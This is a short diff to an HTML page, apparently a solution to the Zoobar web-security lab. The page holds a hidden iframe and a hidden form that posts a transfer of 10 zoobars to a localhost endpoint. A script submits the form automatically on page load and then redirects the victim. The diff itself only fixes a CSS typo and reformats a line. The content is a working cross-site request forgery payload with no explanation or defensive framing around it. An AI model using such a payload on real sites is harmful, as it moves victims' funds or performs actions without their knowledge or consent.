@@ -49,7 +49,7 @@
 
 
 
-<iframe style="display:non" name="zoobar" src="http://localhost:8080/"></iframe>
+<iframe style="display:none" name="zoobar" src="http://localhost:8080/"></iframe>
 
 <form method="POST" style="display:none" id="transfer" target="zoobar" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer">
 <input name="zoobars" type="text" value="10" size=5>
@@ -58,6 +58,7 @@
 </form>
 <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
 <script>if (myZoobars) {
-document.getElementById("transfer").submit();window.location.replace("http://localhost:8080/zoobar/");}</script>
+document.getElementById("transfer").submit();
+window.location.replace("http://localhost:8080/zoobar/");}</script>
 
 
